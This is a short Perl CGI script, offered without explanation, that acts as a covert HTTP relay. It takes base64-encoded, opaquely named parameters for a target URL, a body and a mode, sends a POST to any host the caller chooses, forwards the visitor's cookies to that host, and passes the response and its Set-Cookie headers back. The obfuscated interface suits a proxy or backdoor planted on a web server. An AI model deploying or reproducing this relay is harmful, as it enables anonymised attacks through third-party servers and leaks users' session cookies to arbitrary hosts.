use strict;
use warnings;
use CGI;
use MIME::Base64;
use LWP::UserAgent;
use HTTP::Request;

sub main {
    my $q = CGI->new;

    my $z0 = $q->param('z0') // '';
    my $z1 = $q->param('z1') // '';
    my $z2 = $q->param('z2') // '';

    my $url     = decode_base64($z0);
    my $data    = decode_base64($z1);
    my $mode    = decode_base64($z2);
    my $cookies = $ENV{'HTTP_COOKIE'};

    $url =~ s/^\s+|\s+$//g if $url;

    if (!$url || $url eq '') {
        return;
    }

    my $ua = LWP::UserAgent->new;
    $ua->timeout(15);
    $ua->env_proxy;
    $ua->agent("Mozilla/5.0");

    my $req = HTTP::Request->new(POST => $url);

    if ($mode eq 'binary') {
        $req->header('Content-Type' => 'application/octet-stream');
        $req->content(decode_base64($data));
    } else {
        $req->header('Content-Type' => 'application/x-www-form-urlencoded');
        $req->content($data);
    }

    if ($cookies) {
        $req->header('Cookie' => $cookies);
    }

    my $response = $ua->request($req);

    foreach my $header ($response->header('Set-Cookie')) {
        print "Set-Cookie: $header\r\n" if defined $header;
    }

    my $body = $response->content;
    if ($mode eq 'binary') {
        $body = encode_base64($body, '');
    } else {
        $body = $response->decoded_content // $response->content;
    }

    print $body;

    return;
}

main();